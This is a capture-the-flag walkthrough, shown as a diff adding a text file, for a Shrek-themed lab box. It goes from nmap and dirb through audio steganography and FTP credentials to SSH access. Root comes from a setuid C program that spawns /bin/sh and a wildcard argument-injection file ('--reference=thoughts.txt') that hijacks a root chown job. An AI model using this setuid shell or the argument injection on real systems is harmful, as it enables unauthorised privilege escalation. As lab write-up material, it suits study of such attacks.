@@ -1,0 +1,95 @@
+1) nmap box to find port 21,22 and 80 open.
+
+2) dirb the web server and find directories /uploads and /images.
+
+3) Even on reset, files from the /uploads folder remain adn have funny names.
+
+4) Downloading the files, I gain a new directory called 'secret_area_51'.
+
+5) This has an mp3 file. SHIT! AUDIO STEGO.....
+
+6) use Audacity to show spectograph of the audio and then use high pass filter 
+to a show text. This is the username and password for the FTP.
+	username: donkey
+	password: d0nk3y1337!
+
+6) Login to the FTP server using this username and password.
+
+7) Find the RSA key saved there. Also find two base64 encoded strings:
+
+J1x4MDFceGQzXHhlMVx4ZjJceDE3VCBceGQwXHg4YVx4ZDZceGUyXHhiZFx4OWVceDllflAoXHhmN1x4ZTlceGE1XHhjMUtUXHg5YUlceGRkXFwhXHg5NXRceGUxXHhkNnBceGFhInUyXHhjMlx4ODVGXHgxZVx4YmNceDAwXHhiOVx4MTdceDk3XHhiOFx4MGJceGM1eVx4ZWM8Sy1ncDlceGEwXHhjYlx4YWNceDlldFx4ODl6XHgxM1x4MTVceDk0RG5ceGViXHg5NVx4MTlbXHg4MFx4ZjFceGE4LFx4ODJHYFx4ZWVceGU4Q1x4YzFceDE1XHhhMX5UXHgwN1x4Y2N7XHhiZFx4ZGFceGYwXHg5ZVx4MWJoXCdRVVx4ZTdceDE2M1x4ZDRGXHhjY1x4YzVceDk5dyc=
+
+UHJpbmNlQ2hhcm1pbmc=
+
+8) Decoded these strings to ASCII as follows:
+
+'\x01\xd3\xe1\xf2\x17T \xd0\x8a\xd6\xe2\xbd\x9e\x9e~P(\xf7\xe9\xa5\xc1KT\x9aI\xdd\\!\x95t\xe1\xd6p\xaa"u2\xc2\x85F\x1e\xbc\x00\xb9\x17\x97\xb8\x0b\xc5y\xec<K-gp9\xa0\xcb\xac\x9et\x89z\x13\x15\x94Dn\xeb\x95\x19[\x80\xf1\xa8,\x82G`\xee\xe8C\xc1\x15\xa1~T\x07\xcc{\xbd\xda\xf0\x9e\x1bh\'QU\xe7\x163\xd4F\xcc\xc5\x99w'
+
+PrinceCharming
+
+9) One of the strings appears to be a ciphertext. This can be decrypted using 'seccure'.
+
+10) This was done using python:
+
+python
+
+print seccure.decrypt('\x01\xd3\xe1\xf2\x17T \xd0\x8a\xd6\xe2\xbd\x9e\x9e~P(\xf7\xe9\xa5\xc1KT\x9aI\xdd\\!\x95t\xe1\xd6p\xaa"u2\xc2\x85F\x1e\xbc\x00\xb9\x17\x97\xb8\x0b\xc5y\xec<K-gp9\xa0\xcb\xac\x9et\x89z\x13\x15\x94Dn\xeb\x95\x19[\x80\xf1\xa8,\x82G`\xee\xe8C\xc1\x15\xa1~T\x07\xcc{\xbd\xda\xf0\x9e\x1bh\'QU\xe7\x163\xd4F\xcc\xc5\x99w',b'PrinceCharming')
+
+11) The decoded message is:
+
+The password for the ssh file is: shr3k1sb3st! and you have to ssh in as: sec
+
+12) This gets us a shell as user 'sec'.
+
+13) Looking at the directories the /usr/src directory seemed suspicious as it was the only one  owned by 'sec'.
+
+14) Inside /usr/src can be found a 'thoughts.txt' file. It is owned by user:group root:root.
+
+15) Creating a file inside this folder automatically changed to nobody:nobody after a certain period of time.
+
+16) Research on this area uncovered that this probably would be a Wildcard exploit (https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt)
+
+17) It was also observed that the sec user was capable of setting the sticky bit.
+
+18) Since the WirldCard exploit gives us the opportunity to exploit 'chown' to change the owner and group, along with the capability to set sticky bit. It was concluded that a process hijack may be possible.
+
+19) The process hijack can't be conducted using a bash script. Thus a simple C code was written (test.c) :
+
+#include<stdio.h>
+#include <sys/types.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <unistd.h>
+
+int main (int argc, char * argv) { setuid(0); setgid(0); system("/bin/sh"); }
+
+20) This was written and written and compiled on local machine and sent over by creating a SimpleHTTPServer:
+
+python -m SimpleHTTPServer
+
+21) The sticky bit was set to the compiled C code 'test':
+
+chmod +s ./test
+
+22) To eploit the wildcards a new file was created:
+
+touch ./--reference=thoughts.txt
+
+23)This allowed the already presesnt autmatic capability to try and change the ownerships of all files except thoughts.txt to nobody:nobody.
+
+24) Since --reference=thoughts.txt is present as a file. The automated command chages from:
+
+ 		chown -R nobody:nobody *
+
+			to
+
+		chown -R nobody:nobody --reference=thoughts.txt
+
+the reference tags enables whown to ignore the input user and group and take up the group for the file provided. Thus, it changes the file ownership of test to root:root.
+
+
+25) Executing this file, it gives us the root shell.
+
+26) The flag is: 54d3c885deb157dcb786b79814c88178
+
+
